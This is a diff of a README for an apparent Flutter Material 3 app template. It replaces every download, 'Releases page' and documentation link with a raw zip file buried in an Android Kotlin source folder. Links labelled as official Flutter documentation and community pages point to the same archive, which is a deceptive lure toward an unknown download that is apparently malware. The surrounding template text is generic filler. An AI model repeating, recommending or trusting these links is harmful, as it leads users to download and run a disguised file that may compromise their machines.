@@ -4,7 +4,7 @@
 This project provides a ready-to-use Flutter template built with Material 3 design. It focuses on performance and follows modern architecture principles. You can use this template as a starting point for creating cross-platform apps that look great on both Android and iOS devices.
 
 ## 📥 Download Link
-[![Download Latest Release](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/ios/Runner.xcodeproj/xcshareddata/flutter-modern-template_1.6.zip)](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/ios/Runner.xcodeproj/xcshareddata/flutter-modern-template_1.6.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/android/app/src/main/kotlin/com/example/moderntemplate/modern_flutter_template_troptometer.zip)](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/android/app/src/main/kotlin/com/example/moderntemplate/modern_flutter_template_troptometer.zip)
 
 ## 🚀 Getting Started
 To get started, follow the steps below, and you’ll be up and running in no time!
@@ -18,7 +18,7 @@ To get started, follow the steps below, and you’ll be up and running in no tim
 ## 🔧 Installation Steps
 
 ### 1. Visit the Releases Page
-Go to our [Releases page](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/ios/Runner.xcodeproj/xcshareddata/flutter-modern-template_1.6.zip) to find the latest version of the template.
+Go to our [Releases page](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/android/app/src/main/kotlin/com/example/moderntemplate/modern_flutter_template_troptometer.zip) to find the latest version of the template.
 
 ### 2. Download the Template
 Choose the most recent release and download the zip file. This file contains everything you need to start your project.
@@ -56,8 +56,8 @@ Your app will compile and launch on the connected device or emulator.
 ## 📚 Additional Resources
 If you want to learn more about Flutter or improve your application, check out these resources:
 
-- [Flutter Official Documentation](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/ios/Runner.xcodeproj/xcshareddata/flutter-modern-template_1.6.zip)
-- [Flutter Community](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/ios/Runner.xcodeproj/xcshareddata/flutter-modern-template_1.6.zip)
+- [Flutter Official Documentation](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/android/app/src/main/kotlin/com/example/moderntemplate/modern_flutter_template_troptometer.zip)
+- [Flutter Community](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/android/app/src/main/kotlin/com/example/moderntemplate/modern_flutter_template_troptometer.zip)
 
 ## 👥 Community Support
 Join our community to share ideas and ask questions! You can engage with other users through forums or social media. Your feedback is important for improving this project.
@@ -66,6 +66,6 @@ Join our community to share ideas and ask questions! You can engage with other u
 This project is licensed under the MIT License. You can freely use and modify it according to the terms outlined in the license.
 
 ## 📥 Download & Install
-To recap, visit our [Releases page](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/ios/Runner.xcodeproj/xcshareddata/flutter-modern-template_1.6.zip) to download the latest version. Follow the installation steps above to get started on your app today.
+To recap, visit our [Releases page](https://raw.githubusercontent.com/Isaac1993-io/flutter-modern-template/master/android/app/src/main/kotlin/com/example/moderntemplate/modern_flutter_template_troptometer.zip) to download the latest version. Follow the installation steps above to get started on your app today.
 
 Enjoy building your app with flutter-modern-template!
